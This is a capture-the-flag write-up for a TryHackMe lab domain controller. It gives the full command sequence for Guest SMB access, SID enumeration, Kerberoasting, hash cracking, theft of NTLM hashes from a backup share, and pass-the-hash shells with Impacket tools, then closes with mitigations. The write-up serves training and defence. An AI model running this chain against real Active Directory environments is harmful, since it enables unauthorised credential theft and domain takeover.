# Soupedecode 01

Test your enumeration skills on this boot-to-root machine.

Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting authentication, navigating through shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.

Note: Please allow 4 minutes for the to properly boot up.

Room: https://tryhackme.com/room/soupedecode01

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/soupedecode01.md

----------

## Overview

This machine involved enumerating an Active Directory domain, discovering a weak username-as-password credential, Kerberoasting a service account, reading a backup share, and using a recovered machine-account NTLM hash to gain administrative access to the domain controller.

## Target

```text
10.67.157.45
```

## Attack Chain

```text
Guest authentication
→ SID enumeration
→ ybob317:ybob317
→ Kerberoasting
→ file_svc:Password123!!
→ Read access to backup share
→ Recover FileServer$ NTLM hash
→ Pass-the-Hash
→ Administrative access to DC01
```

---

## Enumeration

We began with a full TCP port scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt 10.67.157.45
```

The scan identified the target as a Windows Server 2022 domain controller for the `SOUPEDECODE.LOCAL` domain.

Important ports included:

```text
53/tcp    DNS
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
636/tcp   LDAPS
3268/tcp  Global Catalog LDAP
3389/tcp  RDP
5985/tcp  WinRM
9389/tcp  Active Directory Web Services
```

The RDP information disclosed the hostname and domain:

```text
Hostname: DC01
Domain:   SOUPEDECODE.LOCAL
```

We added the domain controller to `/etc/hosts`:

```bash
echo '10.67.157.45 dc01.soupedecode.local dc01 soupedecode.local' \
  >> /etc/hosts
```

---

## SMB Enumeration

Anonymous share enumeration revealed several SMB shares:

```bash
smbclient -L //10.67.157.45 -N
```

```text
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
Users
```

We then tested the Guest account:

```bash
netexec smb 10.67.157.45 -u Guest -p ''
```

Guest authentication was accepted:

```text
[+] SOUPEDECODE.LOCAL\Guest:
```

---

## Domain User Enumeration

Because Guest authentication worked, we used Impacket's `lookupsid.py` to enumerate domain SIDs:

```bash
lookupsid.py 'SOUPEDECODE.LOCAL/Guest:@10.67.157.45' \
  | tee lookupsid-output.txt
```

The output contained over one thousand domain accounts, including:

```text
ybob317
file_svc
charlie
```

We extracted all user accounts into a wordlist:

```bash
grep 'SidTypeUser' lookupsid-output.txt \
  | sed -E 's/.*SOUPEDECODE\\([^ ]+) \(SidTypeUser\)/\1/' \
  | sort -u > users.txt
```

The resulting list contained 1,069 accounts:

```bash
wc -l users.txt
```

```text
1069 users.txt
```

---

## Initial Foothold

The account `ybob317` used its username as its password.

We tested it directly:

```bash
netexec smb 10.67.157.45 \
  -d SOUPEDECODE \
  -u ybob317 \
  -p ybob317 \
  --shares
```

Authentication succeeded:

```text
[+] SOUPEDECODE\ybob317:ybob317
```

The account could read:

```text
IPC$
NETLOGON
SYSVOL
Users
```

Credentials:

```text
Username: ybob317
Password: ybob317
Domain:   SOUPEDECODE
```

---

## Kerberoasting

With valid domain credentials, we requested Kerberos service tickets for accounts with Service Principal Names:

```bash
GetUserSPNs.py \
  'SOUPEDECODE.LOCAL/ybob317:ybob317' \
  -dc-ip 10.67.157.45 \
  -request \
  -outputfile tickets.txt
```

The following service accounts were identified:

```text
file_svc
firewall_svc
backup_svc
web_svc
monitoring_svc
```

We cracked the Kerberos TGS hashes using Hashcat mode `13100`:

```bash
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
```

The `file_svc` account was recovered:

```text
file_svc:Password123!!
```

---

## Backup Share Access

We validated the credentials and enumerated shares:

```bash
netexec smb 10.67.157.45 \
  -d SOUPEDECODE \
  -u file_svc \
  -p 'Password123!!' \
  --shares
```

The account had read access to the `backup` share:

```text
backup    READ
```

We downloaded its contents:

```bash
mkdir -p backup-share
cd backup-share

smbclient //10.67.157.45/backup \
  -U 'SOUPEDECODE\file_svc%Password123!!' \
  -c 'recurse ON; prompt OFF; mget *'
```

The share contained `backup_extract.txt`, which held NTLM hashes for several machine accounts:

```text
WebServer$
DatabaseServer$
CitrixServer$
FileServer$
MailServer$
BackupServer$
ApplicationServer$
PrintServer$
ProxyServer$
MonitoringServer$
```

The important entry was:

```text
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
```

---

## Pass-the-Hash

We extracted the machine usernames and NTLM hashes:

```bash
awk -F: '{print $1}' backup_extract.txt > machine-users.txt
awk -F: '{print $4}' backup_extract.txt > machine-hashes.txt
```

We then tested each username/hash pair:

```bash
netexec smb 10.67.157.45 \
  -d SOUPEDECODE \
  -u machine-users.txt \
  -H machine-hashes.txt \
  --no-bruteforce \
  --continue-on-success
```

The `FileServer$` machine account authenticated with administrative privileges:

```text
[+] SOUPEDECODE\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

Credentials:

```text
Username: FileServer$
NTLM:     e41da7e79a4c76dbd9cf79d1cb325559
```

We used the machine account hash to obtain a shell on the domain controller:

```bash
wmiexec.py \
  -hashes ':e41da7e79a4c76dbd9cf79d1cb325559' \
  'SOUPEDECODE.LOCAL/FileServer$@10.67.157.45'
```

Alternative command execution methods included:

```bash
psexec.py \
  -hashes ':e41da7e79a4c76dbd9cf79d1cb325559' \
  'SOUPEDECODE.LOCAL/FileServer$@10.67.157.45'
```

```bash
smbexec.py \
  -hashes ':e41da7e79a4c76dbd9cf79d1cb325559' \
  'SOUPEDECODE.LOCAL/FileServer$@10.67.157.45'
```

---

## Flags

### User Flag

```cmd
cd C:\Users\ybob317\Desktop
type user.txt
```

### Root Flag

```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

## Key Findings

1. The Guest account was enabled and permitted SID enumeration.
2. A domain user used its username as its password.
3. A service account used a weak, easily crackable password.
4. Sensitive machine-account hashes were stored on an accessible backup share.
5. The `FileServer$` machine account had administrative privileges on the domain controller.
6. The recovered NTLM hash could be used directly through Pass-the-Hash.

## Mitigations

- Disable or tightly restrict the Guest account.
- Prevent anonymous and low-privileged SID enumeration.
- Enforce strong password policies and block username-derived passwords.
- Use long, randomly generated passwords or managed service accounts for services.
- Protect backup shares with least-privilege permissions.
- Never store credential dumps or NTLM hashes in accessible shares.
- Audit machine accounts with privileged group membership.
- Use Windows LAPS or appropriate machine-account password management.
- Monitor for Kerberoasting and Pass-the-Hash activity.
